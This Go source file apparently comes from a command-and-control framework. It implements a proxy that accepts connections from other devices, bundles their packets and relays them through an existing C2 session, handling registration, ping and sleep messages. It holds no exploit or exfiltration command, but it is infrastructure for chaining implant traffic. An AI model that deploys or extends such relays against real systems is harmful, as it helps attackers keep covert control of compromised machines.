package c2

import (
	"context"
	"fmt"
	"net"
	"sync/atomic"

	"github.com/iDigitalFlame/logx/logx"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/com/limits"
	"github.com/iDigitalFlame/xmt/device"
)

// Proxy is a struct that controls a Proxied connection between a client and a server and allows for packets to be
// routed through a current established Session.
type Proxy struct {
	done     uint32
	parent   *Session
	clients  []*proxyClient
	listener net.Listener
	connection
}
type proxySwarm struct {
	new     chan *proxyClient
	close   chan uint32
	clients map[uint32]*proxyClient
}
type proxyClient struct {
	ID device.ID

	send  chan *com.Packet
	peek  *com.Packet
	ready uint32
}

// Wait will block until the current Proxy is closed and shutdown.
func (p *Proxy) Wait() {
	<-p.ctx.Done()
}
func (s *proxySwarm) Close() {
	for k, c := range s.clients {
		c.ID, c.peek = nil, nil
		close(c.send)
		delete(s.clients, k)
	}
	close(s.new)
	close(s.close)
}

func (p *Proxy) Close() error {
	atomic.StoreUint32(&p.done, 1)
	p.cancel()
	return nil
}
func (s *proxySwarm) process() {
	for len(s.new) > 0 {
		n := <-s.new
		s.clients[n.ID.Hash()] = n
	}
	for len(s.close) > 0 {
		i := <-s.close
		if c, ok := s.clients[i]; ok {
			c.ID, c.peek = nil, nil
			close(c.send)
			delete(s.clients, i)
		}
	}
}
func (s *proxySwarm) accept(n *com.Packet) bool {
	if len(s.clients) == 0 {
		return false
	}
	c, ok := s.clients[n.Device.Hash()]
	if !ok {
		return false
	}
	c.send <- n
	atomic.StoreUint32(&c.ready, 1)
	return true
}
func (p *proxyClient) next() (*com.Packet, error) {
	if p.peek == nil && len(p.send) == 0 {
		atomic.StoreUint32(&p.ready, 0)
		return &com.Packet{ID: MsgSleep, Device: p.ID}, nil
	}
	var n *com.Packet
	if p.peek != nil {
		n, p.peek = p.peek, nil
	} else {
		n = <-p.send
	}
	if len(p.send) == 0 && n.Verify(p.ID) {
		if n.ID != MsgSleep {
			atomic.StoreUint32(&p.ready, 1)
		}
		return n, nil
	}
	var (
		v    = &com.Packet{ID: MsgMultiple, Device: p.ID, Flags: com.FlagMulti}
		t    int
		m, a bool
	)
	if n != nil {
		m, t = true, 1
		if n.Flags&com.FlagChannel != 0 {
			v.Flags |= com.FlagChannel
		}
		if err := n.MarshalStream(v); err != nil {
			return nil, err
		}
		n.Clear()
		n = nil
	}
	for len(p.send) > 0 && t < limits.SmallLimit() && v.Size() < limits.FragLimit() {
		n = <-p.send
		if n.Size()+v.Size() > limits.FragLimit() {
			p.peek = n
			break
		}
		if n.Verify(p.ID) {
			a = true
		} else {
			m = true
		}
		if n.Flags&com.FlagChannel != 0 {
			v.Flags |= com.FlagChannel
		}
		if err := n.MarshalStream(v); err != nil {
			return nil, err
		}
		t++
		n.Clear()
		n = nil
	}
	if !a {
		m, t = true, t+1
		n = &com.Packet{ID: MsgPing, Device: p.ID}
		if err := n.MarshalStream(v); err != nil {
			return nil, err
		}
	}
	v.Close()
	if m {
		v.Flags |= com.FlagMultiDevice
	}
	v.Flags.SetLen(uint16(t))
	atomic.StoreUint32(&p.ready, 1)
	return v, nil
}
func (p *Proxy) client(c net.Conn, d *com.Packet) *proxyClient {
	p.parent.log.Trace("[%s:Proxy:%s] %s: Received a packet %q...", p.parent.ID, d.Device, c.RemoteAddr().String(), d.String())
	if p.parent.done != 0 {
		return nil
	}
	d.Flags |= com.FlagProxy
	var (
		i     = d.Device.Hash()
		s, ok = p.parent.swarm.clients[i]
	)
	if !ok {
		s = &proxyClient{ID: d.Device, send: make(chan *com.Packet, cap(p.parent.send)), ready: 1}
		p.parent.send <- d
		p.parent.swarm.new <- s
		p.clients = append(p.clients, s)
		if d.ID == MsgHello {
			if err := writePacket(c, p.w, p.t, &com.Packet{ID: MsgRegistered, Device: d.Device, Job: d.Job}); err != nil {
				p.log.Warning("[%s:Proxy:%s] %s: Received an error writing data to client: %s!", p.parent.ID, d.Device, c.RemoteAddr().String(), err.Error())
			}
			return nil
		}
		return s
	}
	switch {
	case d.Flags&com.FlagMultiDevice != 0:
		p.parent.send <- d
	case atomic.LoadUint32(&s.ready) == 1:
		if d.ID == MsgPing {
			atomic.StoreUint32(&s.ready, 0)
			return s
		}
		fallthrough
	case atomic.LoadUint32(&s.ready) == 0 && d.ID != MsgPing:
		p.parent.send <- d
	}
	return s
}

func (p *Proxy) handlePacket(c net.Conn, o bool) bool {
	d, err := readPacket(c, p.w, p.t)
	if err != nil {
		p.log.Warning("[%s:Proxy] %s: Error occurred during Packet read: %s!", p.parent.ID, c.RemoteAddr().String(), err.Error())
		return o
	}
	if d.Flags&com.FlagMultiDevice == 0 {
		if s := p.client(c, d); s != nil {
			n, err := s.next()
			if err != nil {
				p.log.Warning("[%s:Proxy:%s] %s: Received an error retriving Packet data: %s!", p.parent.ID, s.ID, c.RemoteAddr().String(), err.Error())
			} else {
				p.log.Trace("[%s:Proxy:%s] %s: Sending Packet %q to client...", p.parent.ID, s.ID, c.RemoteAddr().String(), n.String())
				if err = writePacket(c, p.w, p.t, n); err != nil {
					p.log.Warning("[%s:Proxy:%s] %s: Received an error writing data to client: %s!", p.parent.ID, s.ID, c.RemoteAddr().String(), err.Error())
				}
			}
		}
		return d.Flags&com.FlagChannel != 0
	}
	x := d.Flags.Len()
	if x == 0 {
		p.log.Warning("[%s:Proxy:%s] %s: Received an invalid multi Packet!", p.parent.ID, d.Device, c.RemoteAddr().String())
		return d.Flags&com.FlagChannel != 0
	}
	var (
		i, t uint16
		n    *com.Packet
		m    = &com.Packet{ID: MsgMultiple, Flags: com.FlagMulti | com.FlagMultiDevice}
	)
	for ; i < x && p.parent.done == 0; i++ {
		n = new(com.Packet)
		if err := n.UnmarshalStream(d); err != nil {
			p.log.Warning("[%s:Proxy:%s] %s: Received an error when attempting to read a Packet: %s!", p.parent.ID, d.Device, c.RemoteAddr().String(), err.Error())
			return d.Flags&com.FlagChannel != 0
		}
		s := p.client(c, n)
		if s == nil {
			continue
		}
		if r, err := s.next(); err != nil {
			p.log.Warning("[%s:Proxy:%s] %s: Received an error retriving Packet data: %s!", p.parent.ID, s.ID, c.RemoteAddr().String(), err.Error())
		} else {
			if err := r.MarshalStream(m); err != nil {
				p.log.Warning("[%s:Proxy:%s] %s: Received an error writing data to client buffer: %s!", p.parent.ID, s.ID, c.RemoteAddr().String(), err.Error())
				return d.Flags&com.FlagChannel != 0
			}
		}
		n.Clear()
		t++
	}
	m.Flags.SetLen(t)
	m.Close()
	p.log.Trace("[%s:Proxy:%s] %s: Sending Packet %q to client...", p.parent.ID, d.Device, c.RemoteAddr().String(), m.String())
	if err := writePacket(c, p.w, p.t, m); err != nil {
		p.log.Warning("[%s:Proxy:%s] %s: Received an error writing data to client: %s!", p.parent.ID, d.Device, c.RemoteAddr().String(), err.Error())
	}
	return d.Flags&com.FlagChannel != 0
}
func (p *Proxy) handle(c net.Conn) {
	if !p.handlePacket(c, false) {
		c.Close()
		return
	}
	p.log.Debug("[%s:Proxy] %s: Triggered Channel mode, holding open Channel!", p.parent.ID, c.RemoteAddr().String())
	for atomic.LoadUint32(&p.done) == 0 {
		if p.handlePacket(c, true) {
			break
		}
	}
	p.log.Debug("[%s:Proxy] %s: Closing Channel..", p.parent.ID, c.RemoteAddr().String())
	c.Close()
}
func (p *Proxy) listen() {
	p.log.Trace("[%s:Proxy] Starting listen %q...", p.parent.ID, p.listener)
	for atomic.LoadUint32(&p.done) == 0 {
		c, err := p.listener.Accept()
		if err != nil {
			p.parent.log.Error("[%s:Proxy] Received error during Listener accept: %s!", p.parent.ID, err.Error())
			continue
		}
		if c == nil {
			continue
		}
		p.log.Trace("[%s:Proxy] Received a connection from %q...", p.parent.ID, c.RemoteAddr().String())
		go p.handle(c)
	}
	p.parent.log.Debug("[%s:Proxy] Stopping Listener...", p.parent.ID)
	p.cancel()
	for i := range p.clients {
		p.parent.swarm.close <- p.clients[i].ID.Hash()
	}
	p.listener.Close()
}

//	Register   func(*Session)

//	OnOneshot    func(*com.Packet)

// Proxy establishes a new listening Proxy connection using the supplied
// listener that will send any received Packets "upstream" via the current
// Session. Packets destined for hosts connected to this proxy will be routed
// back on forth on this Session.
func (s *Session) Proxy(b string, c serverListener, p *Profile) (*Proxy, error) {
	if c == nil && p != nil {
		c = convertHintListen(p.hint)
	}
	if c == nil {
		return nil, ErrNoConnector
	}
	h, err := c.Listen(b)
	if err != nil {
		return nil, fmt.Errorf("unable to listen on %q: %w", b, err)
	}
	if h == nil {
		return nil, fmt.Errorf("unable to listen on %q", b)
	}
	if s.log == nil {
		s.log = logx.Nop
	}
	l := &Proxy{
		parent:     s,
		listener:   h,
		connection: connection{s: s.s, log: s.log},
	}
	l.ctx, l.cancel = context.WithCancel(s.ctx)
	l.log.Debug("[%s] Added Proxy Listener on %q!", s.ID, b)
	if s.swarm == nil {
		s.swarm = &proxySwarm{
			new:     make(chan *proxyClient, 64),
			close:   make(chan uint32, 64),
			clients: make(map[uint32]*proxyClient),
		}
	}
	go l.listen()
	return l, nil
}
